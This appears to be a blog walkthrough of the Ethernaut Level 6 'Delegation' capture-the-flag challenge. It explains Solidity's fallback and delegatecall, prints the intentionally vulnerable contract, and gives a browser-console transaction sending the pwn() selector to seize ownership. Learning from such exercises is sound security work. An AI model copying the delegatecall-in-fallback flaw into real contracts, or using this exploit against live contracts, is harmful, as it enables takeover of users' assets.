Ethernaut Level 6 Walkthrough: Delegation
=========================================

 



 * [Vinh Tran](https://metana.io/blog/author/vinh-tran/)
* [May 3, 2024](https://metana.io/blog/2024/05/03/)
* [Ethernaut Walkthrough](https://metana.io/blog/category/ethernaut-walkthrough/)














In this level, we will familiarize ourselves with `delegatecall` and `fallback`. This serves as a preliminary step towards understanding more advanced concepts, like the proxy pattern.This article will clarify `delegatecall` and `fallback`, demonstrating how to use this knowledge to overcome this challenge.


Goal of Ethernaut Level 6
-------------------------


Claim `ownership` of `Delegation` contract



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

```

Understanding `fallback` and `delegatecall`
-------------------------------------------


### fallback()


`fallback`¬†is a special function that is executed either when


* calling **non-existent functions**
* sending ether directly to a contract but¬†`receive()`¬†does not exist or¬†`msg.data`¬†is **not** **empty**


In this challenge, we are focusing on the first reason.


**Example**



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FallbackContract {
		event Called(bytes data);
		
    fallback() external {
        emit Called(msg.data);
    }
}

```

* Lets call `helloWorld()` of the above contract, as `helloWorld()` does not exist, `fallback` will be executed.
* If we check emitted event, you will see



```
[
  {
    "from": "0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005",
    "topic": "0x43728e47c6f378312077a49106659446a23766fc65b3674c995b89121d8efeea",
    "event": "Called",
    "args": {
      "0": "0xc605f76c",
      "data": "0xc605f76c"
    }
  }
]

```

### About `msg.data`


`msg.data`¬†is a special variable in Solidity that contains the data that is sent when calling a function on a smart contract.


When invoking a function, `msg.data` consists of the function selector and arguments.


* The¬†**function selector**¬†is the first four bytes of the¬†\*\*\*\*`msg.data`.
* To calculate the function selector:
	1. Compute the keccak256 hash of the function signature (e.g.,¬†`keccak256("helloWorld()")`).
	2. Take the first 4 bytes of the hash.
	3. This resulting value is the function selector.


### delegatecall()


* `delegatecall`¬†is a low level function similar to¬†`call`.
* When contract¬†`A`¬†executes¬†`delegatecall`¬†to contract¬†`B`,¬†`B`‚Äòs code is executed with contract¬†`A`‚Äòs storage,¬†`msg.sender`¬†and¬†`msg.value`.


**Example**



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract A {
		uint256 public number;
		
    function delegateB(address contractB) external {
		    (bool success, bytes memory data) = contractB.delegatecall(
		        abi.encodeWithSignature("increase()")
        );
    }
}

contract B {
		uint256 public number;
		
    function increase() external {
        number+=1;
    }
}

```

* When we execute `delegateB`, it results in the `number` of contract **A** being incremented, instead of the `number` of contract **B**.


Hacking
-------


1. We execute a call to `pwn()` within the **Delegation** contract.
2. As `pwn()` is not a defined function in **Delegation**, the contract invokes its `fallback` function.
3. The `fallback` function then invokes `delegatecall` to execute `pwn()` within the context of the `Delegate` contract, utilizing the storage of `Delegation`.



```
// Open your browser's console
sendTransaction({
		from: "<Player address>",
		to: "<Delegation contract address>",
		data:"0xdd365b8b" // pwn() selector
})

```

Congratulations! You completed the **Ethernaut level 6 ‚Äì Delegation challenge** ü•≥


Security Takeaways
------------------


* Ensure you fully understand the calling contract when using `delegatecall`.
* Please be careful about storage orders when using `delegatecall`. Ensure it correctly changes the state.

FAQs
----


**What is the Ethernaut Level 6: Delegation challenge about?**


* The challenge involves interacting with a delegate call in Ethereum smart contracts to exploit vulnerabilities and take ownership of the contract.


**How do you solve the Delegation level in Ethernaut?**


* The solution requires understanding delegate calls and how they can be manipulated to change contract states, including using the fallback function.


**What skills are necessary to complete Ethernaut Level 6?**


* Knowledge of Solidity, smart contract security, the Ethereum Virtual Machine (EVM), and JavaScript for interacting with the blockchain.


**Can completing Ethernaut Level 6 help improve my blockchain security skills?**


* Yes, it offers practical experience in identifying and exploiting smart contract vulnerabilities, crucial for blockchain security professionals.


**What are delegate calls in Ethereum smart contracts?**


* Delegate calls are a feature that allows one contract to call another‚Äôs function and run it with the original contract‚Äôs storage context.


**Where can I learn more about blockchain security?**


* Consider [online courses](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/), webinars, workshops, and industry conferences focused on cryptocurrency, blockchain technology, and cybersecurity.


**What is Ethernaut and who should try it?**
